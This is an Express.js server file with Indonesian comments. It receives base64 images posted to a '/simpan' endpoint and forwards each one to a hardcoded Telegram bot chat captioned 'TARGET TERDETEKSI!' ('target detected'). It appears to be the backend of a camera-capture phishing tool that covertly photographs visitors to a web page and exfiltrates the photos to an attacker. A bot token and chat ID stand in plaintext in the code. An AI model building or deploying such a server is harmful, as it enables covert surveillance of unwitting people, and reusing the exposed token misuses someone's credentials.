const express = require('express');
const app = express();

app.use(express.json({ limit: '20mb' }));
app.use(express.static('public'));

// Data Telegram asli kamu
const BOT_TOKEN = '8604448756:AAHJ-CdHZpeiEM73TpjnMA5S2O5hu5oeU30'; 
const CHAT_ID = '7381262089';

app.post('/simpan', async (req, res) => {
    try {
        const base64Data = req.body.image;
        if (!base64Data) return res.json({ status: false });

        const base64Image = base64Data.split(';base64,').pop();
        const buffer = Buffer.from(base64Image, 'base64');

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        
        // Membungkus buffer ke Blob agar kompatibel dengan fetch di Node.js terbaru
        const blob = new Blob([buffer], { type: 'image/jpeg' });
        formData.append('photo', blob, 'tangkapan.jpg');
        formData.append('caption', '📸 *TARGET TERDETEKSI!*');
        formData.append('parse_mode', 'Markdown');

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        const hasil = await response.json();
        console.log("Status Telegram:", hasil.ok ? "Sent" : "Failed");
        res.json({ status: hasil.ok });

    } catch (err) {
        console.error("Error Detail:", err.message);
        res.status(500).json({ status: false });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('🚀 Server is running on port ' + PORT);
});